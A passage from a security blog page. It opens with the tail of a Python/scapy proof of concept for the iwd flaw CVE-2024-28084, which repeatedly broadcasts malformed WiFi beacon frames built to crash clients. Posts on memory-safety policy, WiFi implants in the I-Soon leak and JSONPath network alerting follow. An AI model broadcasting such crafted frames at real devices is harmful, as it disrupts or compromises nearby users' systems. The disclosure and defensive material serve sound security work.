style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">dot11_beacon</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> bssid</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        crash</span><span class="token operator">=</span><span class="token string" style="color:rgb(255, 121, 198)">b&quot;\xdd\x07&quot;</span><span class="token plain"> </span><span class="token operator">+</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">b&quot;\x50\x6f\x9a&quot;</span><span class="token plain"> </span><span class="token operator">+</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">b&quot;\x09&quot;</span><span class="token plain">  </span><span class="token operator">+</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">b&quot;\x19\x08\x00&quot;</span><span class="token plain"> </span><span class="token operator">+</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">b&quot;\xdd\x10&quot;</span><span class="token plain"> </span><span class="token operator">+</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">b&quot;\x50\x6f\x9a&quot;</span><span class="token plain"> </span><span class="token operator">+</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">b&quot;\x09&quot;</span><span class="token plain"> </span><span class="token operator">+</span><span class="token string" style="color:rgb(255, 121, 198)">b&quot;\x00\x00&quot;</span><span class="token plain"> </span><span class="token operator">+</span><span class="token plain"> b&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        evil_packet </span><span class="token operator">=</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">get_radiotap_header</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token operator">/</span><span class="token plain"> Dot11</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                subtype</span><span class="token operator">=</span><span class="token number">8</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> addr1</span><span class="token operator">=</span><span class="token string" style="color:rgb(255, 121, 198)">&quot;ff:ff:ff:ff:ff:ff&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> addr2</span><span class="token operator">=</span><span class="token plain">bssid</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> addr3</span><span class="token operator">=</span><span class="token plain">bssid</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token operator">/</span><span class="token plain"> Dot11Beacon</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">cap</span><span class="token operator">=</span><span class="token number">0x3101</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token operator">/</span><span class="token plain"> crash</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">sendp</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">evil_packet</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">run</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">interval </span><span class="token operator">=</span><span class="token plain"> </span><span class="token number">0.05</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">while</span><span class="token plain"> </span><span class="token boolean">True</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">dot11_beacon</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">mac</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token comment" style="color:rgb(98, 114, 164)"># Sleep</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            sleep</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">interval</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">sendp</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> packet</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> verbose</span><span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">mode </span><span class="token operator">==</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;stdio&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            x </span><span class="token operator">=</span><span class="token plain"> packet</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">build</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            sys</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">stdout</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token builtin" style="color:rgb(189, 147, 249)">buffer</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">write</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">struct</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">pack</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">&quot;&lt;L&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">len</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">x</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">+</span><span class="token plain"> x</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            sys</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">stdout</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token builtin" style="color:rgb(189, 147, 249)">buffer</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">flush</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">assert</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">mode </span><span class="token operator">==</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;iface&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        sendp</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">packet</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> iface</span><span class="token operator">=</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">iface</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> verbose</span><span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> __name__ </span><span class="token operator">==</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;__main__&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    ap </span><span class="token operator">=</span><span class="token plain"> AP</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">mode</span><span class="token operator">=</span><span class="token string" style="color:rgb(255, 121, 198)">&quot;iface&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> iface</span><span class="token operator">=</span><span class="token string" style="color:rgb(255, 121, 198)">&quot;wlan1&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> channel</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    ap</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">run</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div><footer class="row docusaurus-mt-lg"><div class="col"><b>Tags:</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/pages/blog/tags/iwd">iwd</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/pages/blog/tags/memory-corruption">memory-corruption</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/pages/blog/tags/wifi">wifi</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/pages/blog/tags/cve-2024-28084">CVE-2024-28084</a></li></ul></div></footer></article><article class="margin-bottom--xl" itemprop="blogPost" itemscope="" itemtype="https://schema.org/BlogPosting"><meta itemprop="description" content="Memory Corruption Hardening is Controversial Now?"><header><h2 class="title_f1Hy" itemprop="headline"><a itemprop="url" href="/pages/blog/federal-focus-memory-corruption-2024">Software Safety Looks Different From The Other Side</a></h2><div class="container_mt6G margin-vert--md"><time datetime="2024-03-01T00:00:00.000Z" itemprop="datePublished">March 1, 2024</time> · <!-- -->4 min read</div><div class="margin-top--md margin-bottom--sm row"><div class="col col--6 authorCol_Hf19"><div class="avatar margin-bottom--sm"><div class="avatar__intro" itemprop="author" itemscope="" itemtype="https://schema.org/Person"><div class="avatar__name"><a href="https://twitter.com/defendtheworld" target="_blank" rel="noopener noreferrer" itemprop="url"><span itemprop="name">Alex Radocea</span></a></div></div></div></div></div></header><div class="markdown" itemprop="articleBody"><h2 class="anchor anchorWithStickyNavbar_LWe7" id="memory-corruption-hardening-is-controversial-now">Memory Corruption Hardening is Controversial Now?<a href="#memory-corruption-hardening-is-controversial-now" class="hash-link" aria-label="Direct link to Memory Corruption Hardening is Controversial Now?" title="Direct link to Memory Corruption Hardening is Controversial Now?">​</a></h2>
<p>Social Media has a lot of criticism lately for the push for memory safety as a metric for the labeling of software security.
Between software supply chain susceptibility, command injection, and logic bugs obliterating software regularly,
it doesn&#x27;t seem like its the best candidate for a software safety metric.</p>
<p>The background for why the federal government is reporting in the area is <a href="https://www.whitehouse.gov/briefing-room/presidential-actions/2021/05/12/executive-order-on-improving-the-nations-cybersecurity/" target="_blank" rel="noopener noreferrer">E.O. 14028</a></p>
<p>From the EO there&#x27;s several pushes for software and network safety. These are things like requiring Zero Trust Access for the Federal Government, EDR on federal systems for monitoring and responding to attacks,  SBOMs for supply chain safety, and creating safety standards for IOT devices. Although the main focus is the federal government there&#x27;s an aim to push out software safety standards to the public as a whole.</p>
<p>And it&#x27;s regulation for consumers that I see getting some criticism. NIST&#x27;s key areas interact with the labeling of safety for IOT and consumer software -- which has everyone skeptical because the government may not seem to be the best equipped for leading edge software practices, and regulatory overhead will raise the burden for software developers without necessarily moving software security forward.</p>
<p><img loading="lazy" src="https://www.nist.gov/sites/default/files/images/2022/04/27/EO-task_and-timeline.png" alt="nist-timeline" class="img_ev3q"></p>
<p>On memory safety specifically, two key documents have been released over the past two quarters. The first is <a href="https://www.cisa.gov/sites/default/files/2023-12/The-Case-for-Memory-Safe-Roadmaps-508c.pdf" target="_blank" rel="noopener noreferrer">CISA&#x27;s report on Memory Safety</a>.
The second is the <a href="https://www.whitehouse.gov/wp-content/uploads/2024/02/Final-ONCD-Technical-Report.pdf" target="_blank" rel="noopener noreferrer">ONCD Report on Measuring Memory Safety</a>.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="software-looks-very-fragile-when-youre-good-at-exploitation">Software Looks Very Fragile When You&#x27;re Good At Exploitation<a href="#software-looks-very-fragile-when-youre-good-at-exploitation" class="hash-link" aria-label="Direct link to Software Looks Very Fragile When You&#x27;re Good At Exploitation" title="Direct link to Software Looks Very Fragile When You&#x27;re Good At Exploitation">​</a></h2>
<p>My take on memory safety is that it looks a lot more urgent from the vantage point of an organization with a fully stocked arsenal. Many pieces of software really start to look like an open door. And there&#x27;s just a lot they see the public doesn&#x27;t have regular access to.</p>
<p>To an individual or even a team of defenders at a top 10 tier tech company, things might seem a lot less urgent than they do the whitehouse because exploitation has become difficult. We&#x27;ve come quite a long way since <a href="https://en.wikipedia.org/wiki/Operation_Aurora" target="_blank" rel="noopener noreferrer">Operation Aurora</a> where attackers could spray the 32-bit address space with nops and shellcode to execute code. Between 64-bit address spaces, CFI, ASLR, memory tagging, MTE, shadow stacks, EDR kernel sensors, single-process unikernels, scanners in security coprocessors, yes -- whole swathes of crashes are made interceptable, unexploitable, or vastly unreliable.</p>
<p>It takes whole teams to make successful exploit chains against rich and common attack surfaces. However, if the cost of not having a capability is more than the price of making it, it becomes increasing probable that an exploit will exist until software begins to be fundamentally secure. Ten million, fifty million, a hundred million dollars seems like a ton of money for an exploit chain that&#x27;s one patch away from disappearing. But to the federal government that can create trillions of dollars to solve a global crisis, that amount of funding remains a rounding error.</p>
<p>Likewise, defenders at the US federal government and its partners have access to ongoing and recent attack trends. They see how attackers surreptitiously take advantage of flaws that may not always become public or fully known. To them the situation might look a lot more untenable than it does to leading edge software developers from the tech giants.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="defender-advantage-through-regulatory-controls">Defender Advantage Through Regulatory Controls<a href="#defender-advantage-through-regulatory-controls" class="hash-link" aria-label="Direct link to Defender Advantage Through Regulatory Controls" title="Direct link to Defender Advantage Through Regulatory Controls">​</a></h2>
<p>On one hand -- regulatory burden like we&#x27;ve seen with GDPR in the EU can really hurt developers, as well as user experience. Does anyone feel like the EU solved privacy for citizens or do they feel more surveilled than ever? On the other hand, regulation might just be the thing that helps secure software overcome the marketing department at Insecure Vendor Co. or helps Ada win against C or creates a market for new architectures.</p>
<p>On performance: if we&#x27;re cool with shipping web browsers as native apps with a million NPM packages, we&#x27;ll probably survive okay with compilers that waste instructions.</p></div><footer class="row docusaurus-mt-lg"><div class="col"><b>Tags:</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/pages/blog/tags/usgov">usgov</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/pages/blog/tags/fedgov">fedgov</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/pages/blog/tags/memory-corruption">memory-corruption</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/pages/blog/tags/safety">safety</a></li></ul></div></footer></article><article class="margin-bottom--xl" itemprop="blogPost" itemscope="" itemtype="https://schema.org/BlogPosting"><meta itemprop="description" content="The I Soon Dump"><header><h2 class="title_f1Hy" itemprop="headline"><a itemprop="url" href="/pages/blog/isoon-wifi-exploitation-2024">What the I-Soon Leak Tells Us About WiFi Hacking</a></h2><div class="container_mt6G margin-vert--md"><time datetime="2024-02-22T00:00:00.000Z" itemprop="datePublished">February 22, 2024</time> · <!-- -->3 min read</div><div class="margin-top--md margin-bottom--sm row"><div class="col col--6 authorCol_Hf19"><div class="avatar margin-bottom--sm"><div class="avatar__intro" itemprop="author" itemscope="" itemtype="https://schema.org/Person"><div class="avatar__name"><a href="https://twitter.com/defendtheworld" target="_blank" rel="noopener noreferrer" itemprop="url"><span itemprop="name">Alex Radocea</span></a></div></div></div></div></div></header><div class="markdown" itemprop="articleBody"><h2 class="anchor anchorWithStickyNavbar_LWe7" id="the-i-soon-dump">The I Soon Dump<a href="#the-i-soon-dump" class="hash-link" aria-label="Direct link to The I Soon Dump" title="Direct link to The I Soon Dump">​</a></h2>
<p>&quot;The documents come from iSoon, also known as Auxun, a Chinese firm headquartered in Shanghai that sells third-party hacking and data-gathering services to Chinese government bureaus, security groups and state-owned enterprises. &quot;</p>
<p>The <a href="https://www.washingtonpost.com/world/2024/02/21/china-hacking-leak-documents-isoon/" target="_blank" rel="noopener noreferrer">Washington Post</a> writes that
&quot;The documents show that iSoon met and worked with members of APT41, a Chinese hacking group that was charged by the U.S. Justice Department in 2020 for targeting more than 100 video game firms, universities and other victims worldwide.&quot;</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="wifi-capability-hardware-implants">WiFi Capability: Hardware Implants<a href="#wifi-capability-hardware-implants" class="hash-link" aria-label="Direct link to WiFi Capability: Hardware Implants" title="Direct link to WiFi Capability: Hardware Implants">​</a></h2>
<p>The dump has a product catalogue that starting from page 18, describes hardware implants for persistent access to target environments. These implants are used for accessing a victim network without having to evade
outbound proxies or firewalls, where security monitoring might take place. So they can attack the squishy inside
directly.</p>
<p>They communicate to targets over WiFi and exfiltrate over 3G/4G.</p>
<p><img loading="lazy" alt="implantable-device" src="/pages/assets/images/12756724-394c-4576-b373-7c53f1abbd94_22-08c351cb6c88ab8fcc7ec1dfff54a8b4.png" width="1189" height="1681" class="img_ev3q"></p>
<ul>
<li>They are small, portable, and have 3G/4G internet connectivity</li>
<li>They can be powered or run on a 10A battery that lasts 8-20 hours depending on activity</li>
<li>They can be embedded into a decoy power bank or other device</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="wifi-attack-system">WiFi Attack System<a href="#wifi-attack-system" class="hash-link" aria-label="Direct link to WiFi Attack System" title="Direct link to WiFi Attack System">​</a></h3>
<p>Attackers can also connect into the sensors over 4G connectivity and then attack the environment over WiFi.
It has standard capabilities one finds in tools like Kali Linux.</p>
<p><img loading="lazy" alt="wifi-software-kit" src="/pages/assets/images/d5ff8b65-db15-418a-b33e-169498d79110_12-62e38500bf87ae1efb434e01ea69b276.png" width="1189" height="1681" class="img_ev3q"></p>
<ul>
<li>WEP/WPS/WPA/WPA2 cracking</li>
<li>Cracking can also be done via a more powerful cloud system</li>
<li>Once on a network the device can inspect packets for hashes</li>
<li>Once on a network the device can brute force login credentials for routers</li>
<li>The device can proxy traffic to the local network</li>
</ul>
<p>Uniquely:</p>
<ul>
<li>The device can self destruct</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="whats-not-in-the-dump">What&#x27;s Not in The Dump<a href="#whats-not-in-the-dump" class="hash-link" aria-label="Direct link to What&#x27;s Not in The Dump" title="Direct link to What&#x27;s Not in The Dump">​</a></h3>
<p>What we don&#x27;t see a cache of ready to go router exploits, patched or unpatched,
as well as software/firmware capabilities for unpatched IOT devices which are soft
targets on wifi.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="closing-thoughts-on-detection">Closing Thoughts on Detection<a href="#closing-thoughts-on-detection" class="hash-link" aria-label="Direct link to Closing Thoughts on Detection" title="Direct link to Closing Thoughts on Detection">​</a></h3>
<ul>
<li>Nothing in the documents hits on masquerading implants by MAC address. A good asset inventory might go a long way when the device joins the network</li>
<li>Tools like <a href="https://www.nzyme.org/" target="_blank" rel="noopener noreferrer">Nzyme</a> can help detect WiFi Cracking attempts as well as detect rogue APs in the environment. SPR supports <a href="https://github.com/spr-networks/spr-nzyme-tap/" target="_blank" rel="noopener noreferrer">nzyme taps</a></li>
<li>Building a baseline of WiFi APs would be the best way a defender can detect a WiFi Implant entering the environment</li>
<li>Defenders need internal network sensors as well as sensors on the outbound network</li>
<li>A zero-trust network setup would help mitigate this type of implant reaching an asset&#x27;s networked resources, but would still leave client devices vulnerable to Rogue AP attacks unless they employ zero-trust principles for WiFi connectivity (like EAP-TLS/EAP-TTLS or per-device WPA3 personal passwords)</li>
</ul></div><footer class="row docusaurus-mt-lg"><div class="col"><b>Tags:</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/pages/blog/tags/spyware">spyware</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/pages/blog/tags/wifi">wifi</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/pages/blog/tags/implants">implants</a></li></ul></div></footer></article><article class="margin-bottom--xl" itemprop="blogPost" itemscope="" itemtype="https://schema.org/BlogPosting"><meta itemprop="description" content="Alerting Made Easy"><header><h2 class="title_f1Hy" itemprop="headline"><a itemprop="url" href="/pages/blog/spr-2024-alerts">Alerts to Improve Network Visibility</a></h2><div class="container_mt6G margin-vert--md"><time datetime="2024-01-31T00:00:00.000Z" itemprop="datePublished">January 31, 2024</time> · <!-- -->4 min read</div><div class="margin-top--md margin-bottom--sm row"><div class="col col--6 authorCol_Hf19"><div class="avatar margin-bottom--sm"><div class="avatar__intro" itemprop="author" itemscope="" itemtype="https://schema.org/Person"><div class="avatar__name"><a href="https://twitter.com/defendtheworld" target="_blank" rel="noopener noreferrer" itemprop="url"><span itemprop="name">Alex Radocea</span></a></div></div></div></div></div></header><div class="markdown" itemprop="articleBody"><h2 class="anchor anchorWithStickyNavbar_LWe7" id="alerting-made-easy">Alerting Made Easy<a href="#alerting-made-easy" class="hash-link" aria-label="Direct link to Alerting Made Easy" title="Direct link to Alerting Made Easy">​</a></h2>
<p>We&#x27;ve rolled out a lightweight alerting mechanism built right inside of SPR.</p>
<p>So SPR already has an event system and we wanted to improve the existing notification system
as well as persist alerts for later.</p>
<p>We wanted something with the following properties:</p>
<ul>
<li>Allow powerful matching expressions</li>
<li>Work with our lightweight key-value database for concurrent access</li>
<li>Minimal system performance impact</li>
<li>User Customizable, in UX with minimal coding</li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="the-stack">The stack<a href="#the-stack" class="hash-link" aria-label="Direct link to The stack" title="Direct link to The stack">​</a></h2>
<p>We carry extensive experience building threat detection products in the infosec space.
Typically these have been substantial systems where event and graph databases manage petabytes of information,
and reports get generated as part of data pipelines or by processing during ingestion.</p>
<p>We wanted to keep it simple. So this is the stack we&#x27;ve settled on for alerts:</p>
<ul>
<li>Run alert matching during event ingestion</li>
<li>Keep using BoltDB as a KV which scales well and is already built</li>
<li>Use  <code>PaesslerAG/jsonpath</code> and <code>gval</code> for JSONPath expressions and evaluation</li>
<li>Extensible later with custom operators and functions. We get this from <code>gval</code></li>
<li>UX with our React frontend</li>
</ul>
<p>For advanced users, exporting to InfluxDB, Splunk, or ELK can be done with the <code>sprbus</code> tools or by pulling the API for events,
so threat detection experts can integrate SPR data into more sophisticated detection tools.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="expression-matching-with-jsonpath">Expression Matching with JSONPath<a href="#expression-matching-with-jsonpath" class="hash-link" aria-label="Direct link to Expression Matching with JSONPath" title="Direct link to Expression Matching with JSONPath">​</a></h2>
<p>Let&#x27;s quickly take a tour of <a href="https://www.jsonpath.com" target="_blank" rel="noopener noreferrer">JSONPath</a>.</p>
<p><img loading="lazy" alt="alerts-custom" src="/pages/assets/images/jsonpath-image-8ef8e05fe413ef9ceb88e276a1a282bd.jpg" width="800" height="419" class="img_ev3q"></p>
<p>JSONPath is a query syntax for matching fields of a JSON Object.</p>
<p>Consider the event below</p>
<div class="language-json codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-json codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">{</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  &quot;MAC&quot;: &quot;30:58:90:32:7d:e5&quot;,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  &quot;Reason&quot;: &quot;mismatch&quot;,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  &quot;Status&quot;: &quot;&quot;,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  &quot;Type&quot;: &quot;wpa&quot;,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  &quot;time&quot;: &quot;2024-02-02T04:10:19.511662376Z&quot;,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  &quot;bucket&quot;: &quot;wifi:auth:fail&quot;,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  &quot;MeaningOfLife&quot;: 42</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>To retrieve the <code>MeaningOfLife</code> field, we can construct the following path:</p>
<p><code>$.MeaningOfLife</code> which returns <code>42</code>.</p>
<p>Looking at the basic operators for JSONPath, its very much built to recurse objects and iterate through arrays.
